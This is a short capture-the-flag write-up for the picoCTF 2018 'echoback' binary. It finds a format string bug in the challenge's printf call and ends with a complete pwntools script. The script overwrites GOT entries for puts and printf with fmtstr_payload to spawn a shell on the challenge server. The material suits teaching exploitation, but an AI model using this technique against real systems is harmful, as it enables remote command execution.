Fist I run checksec to see the protections

![image1](/images/picoctf2018-echoback/echoback1.png)

Now I'll open the binary with IDA to see the functions and the assembly, the main function:

![image2](/images/picoctf2018-echoback/echoback2.png)

This function calls `vuln`

![image3](/images/picoctf2018-echoback/echoback3.png)

This takes 0x7f as input and prints it with the `printf` function, this is vulnerable to format strings vulnerability

```bash
$ ./echoback 
input your message:
%x%x%x
ff8af7bc7ff7da43aa


Thanks for sending the message!
```

Now to get the flag you have to overwrite the GOT puts with vuln address, and the GOT printf with the plt system address

![image4](/images/picoctf2018-echoback/echoback4.png)

The final exploit is like this:

```python
from pwn import *

p = remote("2018shell2.picoctf.com", 56800)
#p = process("./echoback")
elf = ELF("./echoback")

puts = elf.got['puts']
printf = elf.got['printf']
system = elf.plt['system']
vuln = 0x080485e7

payload = fmtstr_payload(7,{puts:vuln,printf:system})

p.sendline(payload)
p.sendline("/bin/sh")
p.interactive()
```
